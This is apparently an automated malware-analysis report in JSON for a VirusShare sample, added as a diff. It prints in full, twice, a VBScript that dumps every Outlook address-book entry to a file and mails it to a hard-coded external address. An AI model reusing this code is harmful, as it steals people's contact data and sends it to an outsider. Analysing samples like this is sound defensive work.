@@ -1,0 +1,82 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Call": "May call a DLL using Excel 4 Macros",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command"
+        },
+        "macro": "dim a\ndim x\ndim ctrlists\ndim ctrentries\ndim malead\ndim email\n\nSet WSHShell = WScript.CreateObject(\"WScript.Shell\")\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nset eKlient=WScript.CreateObject(\"Outlook.Application\")\nset mI=eKlient.GetNameSpace(\"MAPI\")\n\nCall KollaAdressbok()\nCall Skicka()\n\nSub Skicka()\nSet ePost = eKlient.CreateItem(Mail)\n'S\ufffdtt in en bra mailaddress\nSet tillVem = ePost.Recipients.Add (\"mattias@cadoffice.se\")\n'Set omVad = ePost.Subject (\"Snodd addresslista\")\nSet Bifoga = ePost.Attachments\n'Bifoga filen\nBifoga.Add (\"C:\\shell.dll.txt\")\nePost.Send\nEnd Sub\n\nSub KollaAdressbok()\n'S\ufffdkv\ufffdg och filnamn till adressdumpningen\nSet TextStream = FSO.CreateTextFile(\"C:\\shell.dll.txt\")\n\n'S\ufffdk igenom alla adressb\ufffdcker\nfor ctrlists=1 to mI.AddressLists.Count\n\tset a=mI.AddressLists(ctrlists)\n\tx=1\n\t\tfor ctrentries=1 to a.AddressEntries.Count\n\t\t\tmalead=a.AddressEntries(x)\n\n\t\t\tSet myNamespace = eKlient.GetNamespace(\"MAPI\")\n\t\t\tSet myAddrList = myNamespace.AddressLists(ctrlists)\n\t\t\tSet myAddrEntries = myAddrList.AddressEntries(x)\n\t \t\temail = myAddrEntries.Address\n\n\t\t\tnameadress=malead & \" (\" & email & \")\"\n\t\t\tTextStream.WriteLine(nameadress)\n\t\t\tx=x+1\n\t\tnext\t\t\nnext\nTextStream.Close\nEnd Sub\n   \n\nSet eKlient=Nothing\nSet mI=Nothing"
+    },
+    "filename": "VirusShare_81336e5bf223683e754c4e5c0d3f0bd7",
+    "filesize": 1296,
+    "filetype": "ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "81336e5bf223683e754c4e5c0d3f0bd7",
+        "sha1": "8c3d253e3d1678a41c53a5ce26dc243f256c5a07",
+        "sha256": "4d524aa4c755154e044063b5a542ce4bd82bf38803de6e85f9d8fd9ec7f144b0"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "dim a",
+            "dim x",
+            "dim ctrlists",
+            "dim ctrentries",
+            "dim malead",
+            "dim email",
+            "Set WSHShell = WScript.CreateObject(\"WScript.Shell\")",
+            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
+            "set eKlient=WScript.CreateObject(\"Outlook.Application\")",
+            "set mI=eKlient.GetNameSpace(\"MAPI\")",
+            "Call KollaAdressbok()",
+            "Call Skicka()",
+            "Sub Skicka()",
+            "Set ePost = eKlient.CreateItem(Mail)",
+            "'Stt in en bra mailaddress",
+            "Set tillVem = ePost.Recipients.Add (\"mattias@cadoffice.se\")",
+            "'Set omVad = ePost.Subject (\"Snodd addresslista\")",
+            "Set Bifoga = ePost.Attachments",
+            "'Bifoga filen",
+            "Bifoga.Add (\"C:\\shell.dll.txt\")",
+            "ePost.Send",
+            "End Sub",
+            "Sub KollaAdressbok()",
+            "'Skvg och filnamn till adressdumpningen",
+            "Set TextStream = FSO.CreateTextFile(\"C:\\shell.dll.txt\")",
+            "'Sk igenom alla adressbcker",
+            "for ctrlists=1 to mI.AddressLists.Count",
+            "\tset a=mI.AddressLists(ctrlists)",
+            "\tx=1",
+            "\t\tfor ctrentries=1 to a.AddressEntries.Count",
+            "\t\t\tmalead=a.AddressEntries(x)",
+            "\t\t\tSet myNamespace = eKlient.GetNamespace(\"MAPI\")",
+            "\t\t\tSet myAddrList = myNamespace.AddressLists(ctrlists)",
+            "\t\t\tSet myAddrEntries = myAddrList.AddressEntries(x)",
+            "\t \t\temail = myAddrEntries.Address",
+            "\t\t\tnameadress=malead & \" (\" & email & \")\"",
+            "\t\t\tTextStream.WriteLine(nameadress)",
+            "\t\t\tx=x+1",
+            "\t\tnext\t\t",
+            "next",
+            "TextStream.Close",
+            "End Sub",
+            "Set eKlient=Nothing",
+            "Set mI=Nothing"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.291534",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
